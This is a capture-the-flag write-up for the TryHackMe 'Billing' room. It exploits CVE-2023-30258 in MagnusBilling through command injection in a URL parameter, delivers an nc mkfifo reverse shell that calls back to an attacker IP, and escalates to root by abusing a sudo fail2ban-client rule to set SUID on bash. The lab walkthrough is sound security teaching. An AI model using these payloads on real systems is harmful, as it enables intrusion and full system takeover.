---
title: "Billing - TryHackMe"
date: 2026-04-11 02:00:00 +0000
categories: [TryHackMe, Writeups]
tags: [privilege-escalation, CVE-2023-30258, gobuster]
image: /assets/img/writeups/covers/billing.png
---
# Billing - TryHackMe
![1.png](/assets/img/writeups/billing/1.png)
**Difficulty:** Easy<br>**Category:** Web Application<br>**Time Required**: 40 min

> ⚠️ **Warning:** This write-up contains the full solution. If you want to try the room yourself first, stop here and come back when you're stuck.

---

## Overview
In this room we exploit a real-world CVE in **MagnusBilling**, an open-source billing application to gain Remote Code Execution (RCE), land an initial shell as a low-privilege user, and then abuse a misconfigured `sudo` rule tied to `fail2ban` to escalate all the way to root.

## Step 1 — Reconnaissance with Nmap

Every pentest starts with a port scan. We use **Nmap** to find out which services are running on the target machine.

```bash
$ nmap -p- 10.114.186.17 -sV -T4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 08:44 +0500
Nmap scan report for 10.114.186.17 (10.114.186.17)
Host is up (0.15s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.91 seconds
```

The scan reveals that **port 80 is open** and running an HTTP web server. That's our entry point.

---

## Step 2 — Visiting the Web Application

Open your browser and navigate to:

```
http://10.114.186.17
```

![1.png](/assets/img/writeups/billing/2.png)

You'll land on the **MagnusBilling** login page. The room instructions explicitly state that **brute forcing is not allowed**, so we will not attempt to guess credentials. Instead, we move on and look for other ways in.

---

## Step 3 — Directory Enumeration with Gobuster

Since we can't brute-force the login, let's look for hidden files and directories in the web application. We use **Gobuster** for this.

```bash
$ gobuster dir -u http://10.114.186.17/mbilling/ -w /usr/share/wordlists/dirb/common.txt -x md -t 60
```

![1.png](/assets/img/writeups/billing/3.png)

Gobuster spits out a list of directories. Visiting them one by one doesn't reveal anything immediately useful. But one entry stands out `/README.md`.

---

## Step 4 — Finding the Version via README.md

Navigate to:

```
http:///mbilling/README.md
```

![1.png](/assets/img/writeups/billing/4.png)

Inside the README file we can see the application version:

```
MagnusBilling 7.x.x
```

This is a critical piece of information. Now that we know the exact software and version, we can search for known vulnerabilities.

---

## Step 5 — Finding a Public Exploit

Head over to [Exploit-DB](https://www.exploit-db.com) and search for:

```
MagnusBilling
```
![1.png](/assets/img/writeups/billing/5.png)
You'll find an exploit entry for **CVE-2023-30258**. This is an unauthenticated **Remote Code Execution** vulnerability in MagnusBilling 7.x.x.

**What is this vulnerability?**

The file `lib/icepay/icepay.php` improperly handles a GET parameter called `democ`. It passes user input directly into a system command without any sanitisation. This means we can inject shell commands and have the server execute them without even needing to log in.<br><br>The vulnerable endpoint looks like this:

```
http://10.114.186.17/mbilling/lib/icepay/icepay.php?democ=<COMMAND_INJECTION_HERE>
```

The `;` character is what makes injection possible it terminates the existing command and lets us start a new one.

---

## Step 6 — Getting a Reverse Shell

Now that we know we can run arbitrary commands on the server, our goal is to get an **interactive reverse shell** essentially making the server connect back to our machine so we can type commands directly.

### Set Up a Listener

On your attacking machine, open a terminal and start a **Netcat listener** on port 1234:

```bash
$ nc -lvnp 1234
```

This waits for an incoming connection from the target.

### Craft the Reverse Shell Payload

We'll use the **nc mkfifo** reverse shell. Go to [Reverse Shell Generator](https://www.revshells.com), select **nc mkfifo**, enter your IP and port, and copy the payload. It will look like:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.153.26 1234 >/tmp/f
```
![1.png](/assets/img/writeups/billing/7.png)
Since this payload is going into a URL, we need to **URL-encode** it (spaces and special characters can't go raw in a URL). The final URL looks like:

```
http://10.114.186.17/mbilling/lib/icepay/icepay.php?democ=%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192%2E168%2E153%2E26%201234%20%3E%2Ftmp%2Ff%3B
```

Paste this into your browser and hit **Enter**.
![1.png](/assets/img/writeups/billing/6.png)
### Catch the Shell

Switch back to your Netcat terminal. You should see:

```
connect to [192.168.153.26] from (UNKNOWN) [10.114.186.17] 53630
sh: 0: can't access tty; job control turned off
$ 
```
![1.png](/assets/img/writeups/billing/8.png)

You now have a shell on the target machine as the `asterisk` user.

---

## Step 7 — User Flag

Now that we're in, let's grab the first flag:

```bash
$ cat /home/magnus/user.txt
```

You'll see the user flag. Copy it and submit it on TryHackMe.

---

## Step 8 — Privilege Escalation

We have a shell but we're a low-privilege user. Our goal now is to become **root**. Let's check what we're allowed to run with elevated privileges.

```bash
$ sudo -l
```

**Output:**

```
User asterisk may run the following commands on ip-10-114-186-17:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

This tells us that the `asterisk` user can run `/usr/bin/fail2ban-client` as root — without needing a password.

### What is Fail2Ban?

**Fail2Ban** is a security tool that monitors log files and automatically bans IP addresses that show suspicious behaviour (like too many failed login attempts). It does this by running "actions", small scripts or commands when certain thresholds are crossed.<br><br>The key thing here: **we can define our own actions**, and since we can run `fail2ban-client` as root, any action we define will also run as root.

---

### The Exploitation — Step by Step

#### Step 1 — List Active Jails

```bash
$ sudo /usr/bin/fail2ban-client status
```

A `jail` in Fail2Ban is a monitoring rule for a specific service (e.g., SSH, web server). This command lists all active jails. Pick any one from the output — for example `asterisk-iptables`.

#### Step 2 — Check Existing Actions on the Jail

```bash
$ sudo /usr/bin/fail2ban-client get asterisk-iptables actions
```
**Output:**
````
The jail asterisk-iptables has the following actions:
iptables-allports-ASTERISK
````
This lists the actions currently attached to the jail. We're just checking what's there — we'll add our own next.

#### Step 3 — Add a New Malicious Action

```bash
$ sudo /usr/bin/fail2ban-client set asterisk-iptables addaction bad
```

We create a new action called `bad` inside the `asterisk-iptables` jail. The name is arbitrary — what matters is what we attach to it next.

#### Step 4 — Define What the Action Does

```bash
$ sudo /usr/bin/fail2ban-client set asterisk-iptables action bad actionban "chmod +s /bin/bash"
```

We set the `actionban` command for our `bad` action to `chmod +s /bin/bash`.<br><br>**What does `chmod +s /bin/bash` do?**<br><br>It sets the **SUID bit** on `/bin/bash`. Normally, when you run a program, it runs with your own user's permissions. But if a binary has the SUID bit set and it's owned by root, it runs with **root's permissions** regardless of who executes it. Setting SUID on `/bin/bash` means we'll be able to spawn a root shell.

#### Step 5 — Trigger the Action

```bash
$ sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.5
```

We tell Fail2Ban to "ban" a fake IP address `1.2.3.5`. This triggers the `actionban` command — which runs `chmod +s /bin/bash` **as root**.

#### Step 6 — Spawn a Root Shell

```bash
$ /bin/bash -p
```

The `-p` flag tells Bash to **preserve the effective user ID** — which is now root because of the SUID bit we just set. You should see your prompt change to indicate root access:

```
bash-5.x#
```
![1.png](/assets/img/writeups/billing/9.png)
You are now root. Retrieve the `root.txt` flag.
````
$ cat /root/root.txt
`````
My part is done — now it’s your turn. Go ahead and root the machine yourself.
